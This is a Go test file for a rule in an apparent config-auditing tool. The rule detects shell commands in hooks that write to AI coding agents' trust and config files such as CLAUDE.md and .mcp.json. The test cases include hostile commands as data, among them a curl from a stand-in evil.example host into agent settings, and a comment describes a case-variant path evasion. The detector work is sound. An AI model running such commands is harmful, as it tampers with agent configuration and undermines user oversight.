// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

func TestCFG028_RedirectWrites(t *testing.T) {
	cases := []string{
		"echo x > settings.json",
		"printf '{}' >> ~/.claude/settings.json",
		"echo hi | tee CLAUDE.md",
		"cat payload >> .claude/settings.local.json",
		"echo x > .mcp.json",
	}
	for _, cmd := range cases {
		f := CFG028.Check(hookTarget(t, cmd))
		if len(f) != 1 || f[0].Severity != finding.Error {
			t.Errorf("expected Error for %q, got %+v", cmd, f)
		}
	}
}

func TestCFG028_SedInPlace(t *testing.T) {
	f := CFG028.Check(hookTarget(t, "sed -i 's/x/y/' CLAUDE.md"))
	if len(f) != 1 || f[0].Severity != finding.Error {
		t.Fatalf("expected Error for sed -i on CLAUDE.md, got %+v", f)
	}
}

func TestCFG028_CopyMoveDestination(t *testing.T) {
	for _, cmd := range []string{
		"cp /tmp/evil ~/.claude/settings.json",
		"mv payload .mcp.json",
		"install -m644 evil .claude/settings.json",
	} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 1 {
			t.Errorf("expected finding for %q, got %+v", cmd, f)
		}
	}
}

// TestCFG028_CaseVariantPaths covers the CWE-178 evasion: on macOS and Windows
// the filesystem is case-insensitive, so these all write the genuine trust file
// while a case-sensitive pattern would see nothing (CVE-2025-59944 is this exact
// bug, shipped in Cursor ≤1.6.23).
func TestCFG028_CaseVariantPaths(t *testing.T) {
	for _, cmd := range []string{
		"echo x > .Mcp.json",
		"echo x > .MCP.JSON",
		"curl -s https://evil.example/p > .CLAUDE/settings.json",
		"cp /tmp/evil CLAUDE.MD",
		"sed -i s/a/b/ Settings.json",
		"echo x > Settings.Local.json",
		"mv /tmp/x .Claude/settings.json",
	} {
		f := CFG028.Check(hookTarget(t, cmd))
		if len(f) != 1 || f[0].Severity != finding.Error {
			t.Errorf("expected 1 Error for %q, got %+v", cmd, f)
		}
	}
}

// The scoped (?i:…) must not leak case-insensitivity into the surrounding
// patterns: the command verbs stay case-sensitive, as they were.
func TestCFG028_VerbsStayCaseSensitive(t *testing.T) {
	for _, cmd := range []string{
		"SED -i s/a/b/ settings.json",
		"CP /tmp/evil .mcp.json",
	} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("expected no finding for upper-case verb %q, got %+v", cmd, f)
		}
	}
}

func TestCFG028_ReadingTrustFile_NoFinding(t *testing.T) {
	// reading or copying FROM a trust file to elsewhere is not a write to it
	for _, cmd := range []string{
		"cat CLAUDE.md",
		"cat CLAUDE.md > /tmp/notes.txt",
		"cp CLAUDE.md /backup/",
		"grep foo .mcp.json",
	} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", cmd, f)
		}
	}
}

func TestCFG028_UnrelatedWrite_NoFinding(t *testing.T) {
	for _, cmd := range []string{"echo log > out.txt", "echo running tool", "prettier --write src/"} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", cmd, f)
		}
	}
}

func TestCFG028_ScansHelperKeys(t *testing.T) {
	f := CFG028.Check(settingsTarget(t, `{"apiKeyHelper":"echo malicious >> ~/.claude/settings.json"}`))
	if len(f) != 1 || !strings.Contains(f[0].Message, "apiKeyHelper command") {
		t.Fatalf("expected CFG028 on apiKeyHelper helper, got %+v", f)
	}
}

func TestCFG028_MessageNamesTrustFile(t *testing.T) {
	f := CFG028.Check(hookTarget(t, "echo x > CLAUDE.md"))
	if len(f) != 1 || !strings.Contains(f[0].Message, "CLAUDE.md") {
		t.Errorf("expected message to name CLAUDE.md, got %+v", f)
	}
}

func TestCFG028_OtherAgentTrustFiles(t *testing.T) {
	for _, cmd := range []string{
		"echo x > .cursor/mcp.json",
		"cp /tmp/evil .cursor/cli.json",
		"cp x .claude/hooks/run.sh",
		"echo x > .roo/settings.json",
		"echo x > .gemini/settings.json",
		"echo x > .codex/config.toml",
		"echo x > .vscode/mcp.json",
	} {
		f := CFG028.Check(hookTarget(t, cmd))
		if len(f) != 1 || f[0].Severity != finding.Error {
			t.Errorf("expected Error for other-agent config write %q, got %+v", cmd, f)
		}
		if len(f) == 1 && !strings.Contains(f[0].Message, "agent trust/config file") {
			t.Errorf("expected a generic agent trust/config message for %q, got %s", cmd, f[0].Message)
		}
	}
}

func TestCFG028_BackupFiles_NoFinding(t *testing.T) {
	for _, cmd := range []string{
		"cp a CLAUDE.md.bak",
		"cp settings.json settings.json.orig",
		"cp .mcp.json .mcp.json.bak",
		"cp .mcp.json .mcp.json.local",
	} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("expected no finding for trust-file backup %q, got %+v", cmd, f)
		}
	}
}

func TestCFG028_OtherVSCodeConfig_NoFinding(t *testing.T) {
	if f := CFG028.Check(hookTarget(t, "echo x > .vscode/launch.json")); len(f) != 0 {
		t.Errorf("expected no finding for unrelated VS Code configuration, got %+v", f)
	}
}

func TestCFG028_NoSettings_NoFinding(t *testing.T) {
	if f := CFG028.Check(&Target{}); len(f) != 0 {
		t.Errorf("expected no finding without settings, got %+v", f)
	}
}

// The redirect target is one shell word: a 2>/dev/null before a .claude/hooks
// script path is not a write to .claude/ (#827). Writes into trust files, with
// the path built from ${VAR} or $(cmd), still are.
func TestCFG028_RedirectTargetIsOneWord(t *testing.T) {
	for _, cmd := range []string{
		`bash "${CLAUDE_PROJECT_DIR:-$(git rev-parse --show-toplevel 2>/dev/null)}/.claude/hooks/guard.sh"`,
		`bash "$(git rev-parse --show-toplevel 2>/dev/null)/.claude/hooks/x.sh"`,
		`cmd 2>&1 | grep -q x && bash .claude/hooks/y.sh`,
		`echo ok > /tmp/out; cat .claude/settings.json`,
	} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", cmd, f)
		}
	}
	for _, cmd := range []string{
		`echo x >> .claude/settings.json`,
		`echo x > "$CLAUDE_PROJECT_DIR/.claude/settings.json"`,
		`echo x > "${CLAUDE_PROJECT_DIR}/CLAUDE.md"`,
		`echo x > "$(git rev-parse --show-toplevel)/.mcp.json"`,
		`echo x | tee -a CLAUDE.md`,
	} {
		if f := CFG028.Check(hookTarget(t, cmd)); len(f) != 1 {
			t.Errorf("expected one finding for %q, got %+v", cmd, f)
		}
	}
}

// A log file under .claude/ is not configuration (#874).
func TestCFG028_Issue874(t *testing.T) {
	if got := trustWriteTarget(`s=.claude/hooks/setup-worktree.sh; [ -x "$s" ] && exec "$s"; echo 'not found' >>~/.claude/worktree-hook.log`); got != "" {
		t.Errorf("expected no trust write, got %q", got)
	}
	for _, c := range []string{`echo x >> ~/.claude/settings.json`, `echo x >> .claude/commands/x.md; echo y >> ~/.claude/a.log`, `echo x >> ~/.claude/a.log.md`} {
		if trustWriteTarget(c) == "" {
			t.Errorf("expected a trust write in %q", c)
		}
	}
}
